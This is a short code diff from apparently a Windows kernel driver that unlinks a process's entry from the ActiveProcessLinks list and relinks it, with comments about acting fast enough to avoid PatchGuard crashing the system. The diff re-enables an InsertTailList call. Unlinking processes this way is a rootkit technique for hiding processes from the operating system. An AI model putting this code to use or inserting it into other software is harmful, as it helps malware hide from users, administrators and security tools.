@@ -171,7 +171,7 @@ namespace eprocess
 		kEprocessMutex.Lock();
 		if (IsDetached())
 		{
-			// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
+			// What ever you do, the value-assign must be as quick as possible or PatchGuard come for BSOD :)))
 			PLIST_ENTRY cur = GetActiveProcessLinks();
 			RemoveEntryList(cur);
 			SetPrevEntryProc(cur);
@@ -191,8 +191,8 @@ namespace eprocess
 			PLIST_ENTRY cur = GetActiveProcessLinks();
 			PLIST_ENTRY prev = proc.GetActiveProcessLinks();
 			PLIST_ENTRY next = prev->Flink;
-			// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
-			//InsertTailList(prev, cur);
+			// What ever you do, the value-assign must be as quick as possible or PatchGuard come for BSOD :)))
+			InsertTailList(prev, cur);
 			/*
 			cur->Blink = prev;
 			cur->Flink = next;
